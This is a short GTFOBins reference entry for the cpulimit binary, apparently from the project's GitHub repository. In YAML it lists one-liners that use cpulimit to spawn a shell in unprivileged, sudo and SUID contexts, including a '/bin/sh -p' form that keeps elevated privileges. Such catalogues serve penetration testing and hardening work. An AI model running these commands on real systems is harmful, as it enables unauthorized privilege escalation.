<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/cpulimit -->
---
functions:
  shell:
  - code: |-
      cpulimit -l 100 -f -- /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          cpulimit -l 100 -f -- /bin/sh -p
      unprivileged:
...
